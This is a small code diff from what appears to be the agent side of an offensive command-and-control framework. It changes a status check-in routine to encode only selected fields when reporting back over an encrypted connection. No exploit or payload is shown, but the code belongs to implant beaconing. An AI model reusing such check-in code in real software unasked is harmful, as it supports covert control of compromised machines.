@@ -46,7 +46,7 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	secureConn := transport.NewSecureConn(conn)
 
 	out := cbor.NewEncoder(secureConn)
-	err = out.Encode(info)
+	err = out.Encode(info.CheckinFields())
 	if err != nil {
 		return fmt.Errorf("encode agent info: %v", err)
 	}
